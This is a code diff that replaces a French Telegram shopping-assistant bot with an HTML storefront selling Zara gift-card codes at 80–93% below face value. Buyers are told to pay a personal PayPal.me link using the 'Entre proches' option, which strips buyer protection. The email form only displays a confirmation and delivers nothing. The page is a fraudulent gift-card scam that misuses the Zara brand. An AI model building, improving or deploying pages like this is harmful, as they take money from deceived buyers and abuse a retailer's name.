@@ -1,137 +1,589 @@
-import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    filters,
-    ContextTypes,
-    ConversationHandler
-)
-
-# Configuration du logging
-logging.basicConfig(level=logging.INFO)
-
-# États pour la ConversationHandler (Recherche par Image)
-WAITING_FOR_PHOTO = 1
-
-# 1. Commande /start
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_name = update.effective_user.first_name
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boutique Codes Cadeaux Zara</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     
-    keyboard = [
-        [InlineKeyboardButton("🔥 Promos Zara", callback_data="promos")],
-        [InlineKeyboardButton("📸 Trouver via une photo", callback_data="search_photo")],
-        [
-            InlineKeyboardButton("🔔 Mes Alertes Stock", callback_data="alerts"),
-            InlineKeyboardButton("📉 Suivi des Prix", callback_data="price_tracker")
-        ],
-        [InlineKeyboardButton("👗 Cabine d'essayage IA", callback_data="fitting_room")],
-        [InlineKeyboardButton("💬 Service Client Zara", callback_data="support")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        f"Bonjour {user_name} ! 🛍️ Bienvenue sur ton assistant personnel **Zara**.\n\n"
-        "Que souhaites-tu faire aujourd'hui ?",
-        reply_markup=reply_markup,
-        parse_mode="Markdown"
-    )
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
 
-# 2. Gestionnaire des boutons du menu
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "promos":
-        await query.edit_message_text(
-            "🔥 **Promotions actuelles Zara :**\n\n"
-            "• Manteau en laine : ~89,95€~ **59,95€** (-33%)\n"
-            "• Jean Wide Leg : ~39,95€~ **25,95€** (-35%)\n"
-            "• Robe satinée : ~49,95€~ **29,95€** (-40%)",
-            parse_mode="Markdown"
-        )
+        body {
+            background-color: #f4f4f6;
+            color: #111111;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
 
-    elif query.data == "alerts":
-        await query.edit_message_text(
-            "🔔 **Gestion des Alertes de Stock**\n\n"
-            "Vos alertes actives :\n"
-            "• Veste en cuir Biker (Taille M) - *En attente de réapprovisionnement*\n\n"
-            "💡 *Pour ajouter une alerte, envoyez-moi la référence du produit Zara.*"
-        )
+        /* HEADER */
+        header {
+            max-width: 1200px;
+            width: 100%;
+            margin: 0 auto 30px auto;
+            background: #ffffff;
+            padding: 20px 30px;
+            border-radius: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
 
-    elif query.data == "price_tracker":
-        await query.edit_message_text(
-            "📉 **Suivi de Baisse de Prix**\n\n"
-            "Articles suivis :\n"
-            "• Blazer Croisé - Prix actuel : 69,95€ (Objectif : < 50,00€)\n\n"
-            "Vous recevrez une notification dès que le prix baisse !"
-        )
+        .logo {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
 
-    elif query.data == "fitting_room":
-        await query.edit_message_text(
-            "👗 **Cabine d'essayage virtuelle IA**\n\n"
-            "Cette fonctionnalité vous permet de visualiser un vêtement Zara sur vous.\n"
-            " Envoyez une photo de vous en pied, puis le lien du vêtement."
-        )
+        .logo span {
+            color: #2563eb;
+        }
 
-    elif query.data == "support":
-        await query.edit_message_text(
-            "💬 **Support Zara**\n\n"
-            "• Retours & Remboursements : 30 jours à compter de l'achat.\n"
-            "• Délais de livraison : 2 à 4 jours ouvrés.\n\n"
-            "Un conseiller peut prendre le relais si besoin."
-        )
+        .cart-badge-btn {
+            background: #111827;
+            color: #ffffff;
+            padding: 10px 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            border: none;
+            transition: background 0.2s;
+        }
 
-# 3. Fonctionnalité : Recherche par Photo
-async def start_photo_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(
-        "📸 Envoyez-moi une photo du vêtement que vous cherchez, "
-        "et je trouverai le modèle équivalent chez Zara !"
-    )
-    return WAITING_FOR_PHOTO
+        .cart-badge-btn:hover {
+            background: #2563eb;
+        }
 
-async def process_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    photo_file = await update.message.photo[-1].get_file()
-    
-    # Message de confirmation (ici vous intégreriez votre API d'analyse d'image)
-    await update.message.reply_text(
-        "🔍 Analyse de l'image en cours...\n\n"
-        "✨ **Résultat trouvé chez Zara :**\n"
-        "• **Robe Courte Imprimée** (Réf: 3121/044)\n"
-        "• Prix : 39,95€\n"
-        "• Disponibilité : En stock"
-    )
-    return ConversationHandler.END
+        /* CONTAINER GENERAL ET PAGES */
+        .main-container {
+            max-width: 1200px;
+            width: 100%;
+            margin: 0 auto;
+            flex-grow: 1;
+        }
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Recherche annulée.")
-    return ConversationHandler.END
+        .page-view {
+            display: none;
+        }
 
-# 4. Lancement du bot
-def main():
-    # Remplace 'TON_TOKEN_HERE' par ton véritable token BotFather
-    application = Application.builder().token("TON_TOKEN_HERE").build()
+        .page-view.active {
+            display: block;
+        }
 
-    # Configuration de la recherche par photo (Conversation)
-    photo_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(start_photo_search, pattern="^search_photo$")],
-        states={
-            WAITING_FOR_PHOTO: [MessageHandler(filters.PHOTO, process_photo)]
-        },
-        fallbacks=[CommandHandler("cancel", cancel)]
-    )
+        /* BANNIERE EXPLICATIVE */
+        .how-it-works {
+            background: #ffffff;
+            padding: 20px 25px;
+            border-radius: 16px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            border: 1px solid #e5e7eb;
+            margin-bottom: 30px;
+        }
 
-    # Ajout des gestionnaires
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(photo_handler)
-    application.add_handler(CallbackQueryHandler(button_handler))
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
 
-    # Démarrage
-    application.run_polling()
+        .step-number {
+            background: #111;
+            color: #fff;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
 
-if __name__ == "__main__":
-    main()
+        .step-text h4 {
+            font-size: 14px;
+            font-weight: 700;
+        }
+
+        .step-text p {
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        /* SHOP GRID */
+        .shop-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+        }
+
+        /* FICHE PRODUIT */
+        .product-card {
+            background: #ffffff;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid #e5e7eb;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+        }
+
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.08);
+        }
+
+        .card-image {
+            background: #fafafa;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .card-image img {
+            max-width: 70%;
+            max-height: 100px;
+            object-fit: contain;
+        }
+
+        .tag-promo {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #ef4444;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 5px 10px;
+            border-radius: 8px;
+            text-transform: uppercase;
+        }
+
+        .card-body {
+            padding: 20px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .product-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: #111827;
+            margin-bottom: 5px;
+        }
+
+        .product-subtitle {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 15px;
+        }
+
+        .price-section {
+            background: #f9fafb;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .price-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: #6b7280;
+        }
+
+        .price-value-container {
+            text-align: right;
+        }
+
+        .price-pay {
+            font-size: 26px;
+            font-weight: 900;
+            color: #16a34a;
+            line-height: 1;
+        }
+
+        .price-value-code {
+            font-size: 12px;
+            color: #9ca3af;
+            text-decoration: line-through;
+        }
+
+        .btn-buy {
+            display: block;
+            width: 100%;
+            background: #111827;
+            color: #ffffff;
+            text-align: center;
+            padding: 14px 0;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .btn-buy:hover {
+            background: #2563eb;
+        }
+
+        .btn-back {
+            background: transparent;
+            border: none;
+            color: #6b7280;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn-back:hover {
+            color: #111827;
+        }
+
+        /* PAGE DETAIL ET PANIER STRUCTURE */
+        .detail-box, .cart-box, .success-box {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #e5e7eb;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .btn-remove {
+            background: #fee2e2;
+            color: #ef4444;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .cart-total-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 25px;
+            margin-bottom: 25px;
+            font-size: 20px;
+            font-weight: 900;
+        }
+
+        .paypal-notice {
+            font-size: 12px;
+            color: #6b7280;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .paypal-notice strong {
+            color: #d97706;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #d1d5db;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+
+        /* FOOTER SUPPORT */
+        footer {
+            max-width: 1200px;
+            width: 100%;
+            margin: 40px auto 0 auto;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        footer a {
+            color: #5865F2;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header>
+        <div class="logo" onclick="showPage('catalog-page')">E-Store <span>Codes Zara</span></div>
+        <button class="cart-badge-btn" onclick="showPage('cart-page')">🛒 Panier (<span id="cart-count">0</span>)</button>
+    </header>
+
+    <div class="main-container">
+
+        <!-- 1. CATALOGUE DE PRODUITS -->
+        <div id="catalog-page" class="page-view active">
+            <div class="how-it-works">
+                <div class="step-item">
+                    <div class="step-number">1</div>
+                    <div class="step-text">
+                        <h4>Choisissez le code</h4>
+                        <p>Sélectionnez la valeur souhaitée</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">2</div>
+                    <div class="step-text">
+                        <h4>Payez sur PayPal</h4>
+                        <p>Sélectionnez "Entre proches"</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">3</div>
+                    <div class="step-text">
+                        <h4>Recevez votre code</h4>
+                        <p>Livraison directe après paiement</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="shop-container" id="products-list"></div>
+        </div>
+
+        <!-- 2. PAGE FICHE PRODUIT DETAILLEE -->
+        <div id="detail-page" class="page-view">
+            <button class="btn-back" onclick="showPage('catalog-page')">← Retour aux offres</button>
+            <div class="detail-box">
+                <div class="card-image" style="border-radius: 12px; margin-bottom: 20px;">
+                    <span id="detail-tag" class="tag-promo"></span>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg" alt="Zara Logo">
+                </div>
+                <h2 id="detail-title" class="product-title" style="font-size: 24px;"></h2>
+                <p id="detail-subtitle" class="product-subtitle" style="font-size: 15px; margin-bottom: 20px;"></p>
+                
+                <div class="price-section">
+                    <div>
+                        <div class="price-label">Prix à payer</div>
+                        <div id="detail-value" class="price-value-code"></div>
+                    </div>
+                    <div class="price-value-container">
+                        <div id="detail-price" class="price-pay"></div>
+                    </div>
+                </div>
+
+                <button class="btn-buy" onclick="addToCartFromDetail()">Ajouter au panier</button>
+            </div>
+        </div>
+
+        <!-- 3. PAGE PANIER ET REGLEMENT -->
+        <div id="cart-page" class="page-view">
+            <button class="btn-back" onclick="showPage('catalog-page')">← Continuer mes achats</button>
+            <div class="cart-box">
+                <h2 style="margin-bottom: 20px;">Votre Panier</h2>
+                <div id="cart-items-list"></div>
+                
+                <div class="cart-total-row">
+                    <span>Total à payer :</span>
+                    <span id="cart-total-price" style="color: #16a34a;">0 €</span>
+                </div>
+
+                <button id="paypal-pay-btn" class="btn-buy" onclick="proceedToPayPal()">Payer avec PayPal</button>
+                <div class="paypal-notice">⚠️ Choisir impérativement <strong>"Entre proches"</strong> sur PayPal</div>
+            </div>
+        </div>
+
+        <!-- 4. PAGE POST-PAIEMENT (SAISIE EMAIL) -->
+        <div id="success-page" class="page-view">
+            <div class="success-box">
+                <h2>Paiement effectué ? 🎉</h2>
+                <p style="font-size: 14px; color: #6b7280; margin-top: 10px;">
+                    Saisissez l'adresse email sur laquelle vous souhaitez recevoir vos codes Zara :
+                </p>
+                <form onsubmit="submitEmail(event)">
+                    <input type="email" id="user-email" placeholder="votre.email@exemple.com" required>
+                    <button type="submit" class="btn-buy">Valider et recevoir mes codes</button>
+                </form>
+                <div id="confirmation-msg" style="display:none; margin-top: 15px; color: #16a34a; font-weight: 700; text-align: center;">
+                    ✅ Merci ! Vos codes seront envoyés à cette adresse sous quelques minutes.
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- FOOTER SUPPORT DISCORD -->
+    <footer>
+        Un problème avec votre commande ? <a href="https://discord.gg/54NngFNzna" target="_blank">Rejoindre notre Support Discord</a>
+    </footer>
+
+    <script>
+        // Données des produits Zara
+        const products = [
+            { id: 1, title: "Code Carte 50 €", value: 50, price: 10, tag: "-80% REDUCTION" },
+            { id: 2, title: "Code Carte 100 €", value: 100, price: 15, tag: "-85% REDUCTION" },
+            { id: 3, title: "Code Carte 200 €", value: 200, price: 20, tag: "POPULAIRE" },
+            { id: 4, title: "Code Carte 500 €", value: 500, price: 30, tag: "TOP VENTE" },
+            { id: 5, title: "Code Carte 800 €", value: 800, price: 50, tag: "-93% REDUCTION" },
+            { id: 6, title: "Code Carte 1000 €", value: 1000, price: 70, tag: "OFFRE VIP" }
+        ];
+
+        let cart = [];
+        let currentProduct = null;
+
+        // Génération du catalogue dans la page
+        function renderCatalog() {
+            const container = document.getElementById('products-list');
+            container.innerHTML = products.map(p => `
+                <div class="product-card" onclick="openDetail(${p.id})">
+                    <div class="card-image">
+                        <span class="tag-promo">${p.tag}</span>
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg" alt="Zara Logo">
+                    </div>
+                    <div class="card-body">
+                        <div>
+                            <div class="product-title">${p.title}</div>
+                            <div class="product-subtitle">Vous recevez un code d'une valeur de ${p.value}€</div>
+                        </div>
+                        <div>
+                            <div class="price-section">
+                                <div>
+                                    <div class="price-label">Prix à payer</div>
+                                    <div class="price-value-code">Valeur : ${p.value} €</div>
+                                </div>
+                                <div class="price-value-container">
+                                    <div class="price-pay">${p.price} €</div>
+                                </div>
+                            </div>
+                            <button class="btn-buy">Voir la fiche</button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Navigation entre les pages
+        function showPage(pageId) {
+            document.querySelectorAll('.page-view').forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            if (pageId === 'cart-page') renderCart();
+        }
+
+        // Fiche produit
+        function openDetail(productId) {
+            currentProduct = products.find(p => p.id === productId);
+            document.getElementById('detail-tag').innerText = currentProduct.tag;
+            document.getElementById('detail-title').innerText = currentProduct.title;
+            document.getElementById('detail-subtitle').innerText = `Vous recevez un code d'une valeur de ${currentProduct.value}€`;
+            document.getElementById('detail-value').innerText = `Valeur : ${currentProduct.value} €`;
+            document.getElementById('detail-price').innerText = `${currentProduct.price} €`;
+            showPage('detail-page');
+        }
+
+        // Panier
+        function addToCartFromDetail() {
+            if (currentProduct) {
+                cart.push(currentProduct);
+                updateCartCount();
+                showPage('cart-page');
+            }
+        }
+
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            updateCartCount();
+            renderCart();
+        }
+
+        function updateCartCount() {
+            document.getElementById('cart-count').innerText = cart.length;
+        }
+
+        function renderCart() {
+            const container = document.getElementById('cart-items-list');
+            const totalSpan = document.getElementById('cart-total-price');
+            const payBtn = document.getElementById('paypal-pay-btn');
+
+            if (cart.length === 0) {
+                container.innerHTML = "<p style='color: #6b7280; text-align: center; padding: 20px;'>Votre panier est vide.</p>";
+                totalSpan.innerText = "0 €";
+                payBtn.style.display = "none";
+                return;
+            }
+
+            payBtn.style.display = "block";
+            container.innerHTML = cart.map((item, index) => `
+                <div class="cart-item">
+                    <div>
+                        <strong>${item.title}</strong>
+                        <div style="font-size: 12px; color: #6b7280;">Valeur : ${item.value}€</div>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span style="font-weight: 800; color: #16a34a;">${item.price} €</span>
+                        <button class="btn-remove" onclick="removeFromCart(${index})">X</button>
+                    </div>
+                </div>
+            `).join('');
+
+            const total = cart.reduce((sum, item) => sum + item.price, 0);
+            totalSpan.innerText = `${total} €`;
+        }
+
+        // Redirection PayPal et suivi
+        function proceedToPayPal() {
+            const total = cart.reduce((sum, item) => sum + item.price, 0);
+            if (total > 0) {
+                window.open(`https://www.paypal.me/PaMe372106/${total}EUR`, '_blank');
+                showPage('success-page');
+            }
+        }
+
+        function submitEmail(e) {
+            e.preventDefault();
+            document.getElementById('confirmation-msg').style.display = 'block';
+        }
+
+        // Initialisation
+        renderCatalog();
+    </script>
+</body>
+</html>
